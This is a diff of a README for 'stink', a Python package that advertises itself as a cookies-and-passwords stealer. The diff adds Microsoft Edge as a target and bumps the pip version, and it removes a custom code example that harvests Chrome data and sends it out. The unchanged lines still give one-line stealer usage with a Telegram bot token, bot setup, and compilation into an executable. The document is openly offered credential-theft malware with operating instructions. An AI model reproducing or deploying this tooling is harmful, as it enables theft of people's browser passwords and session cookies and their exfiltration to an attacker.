@@ -13,7 +13,6 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 * [Installation](#Installation)
 * [Example usage](#Example-usage)
   * [Standard](#Standard)
-  * [Custom](#Custom)
 * [Telegram bot setup](#Telegram-bot-setup)
   * [Getting token](#Getting-token)
   * [Getting id](#Getting-id)
@@ -22,7 +21,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
   * [CMD](#CMD)
 
 ### Current features
-1. Collecting cookies and passwords of the following browsers: Chrome, Opera, Opera GX.
+1. Collecting cookies and passwords of the following browsers: Chrome, Opera, Opera GX, Microsoft Edge.
 2. Sending collected data as an archive to Telegram.
 3. Running in a separate thread.
 4. Screenshots.
@@ -36,7 +35,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 
 You can install the latest version with the command:
 ```
-pip install stink==0.0.5
+pip install stink==0.0.6
 ```
 
 ## Example usage
@@ -49,34 +48,6 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 To enable error output, add the `errors=True` parameter.
 
 The standard ```Stealer``` runs collection on all available browsers and sends the collected data in an archive to you in Telegram.
-
-### Custom
-```python
-from os import mkdir
-from getpass import getuser
-
-from stink.browsers.chrome import Chrome
-from stink.modules.sender import Sender
-
-user = getuser()
-
-zip_name = f"{user}-st"
-storage_path = f"C:/Users/{user}/AppData/"
-storage_folder = "files/"
-
-
-def main():
-
-    mkdir(storage_path + storage_folder)
-
-    Chrome(storage_path, storage_folder, False).run()
-    Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID, False).run()
-
-
-if __name__ == "__main__":
-    main()
-```
-In the custom stealer, you need to prescribe the necessary browsers and the path for storing the collected data yourself. The ```Sender``` module will pack all files into an archive and send it to you in Telegram.
 
 ## Telegram bot setup
 ### Getting token
@@ -146,7 +117,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==0.0.5
+pip install stink==0.0.6
 ```
 6. In the appearing folder venv go to the path `\Lib\site-packages\win32\`.
 7. Copy the file `win32crypt.pyd`.
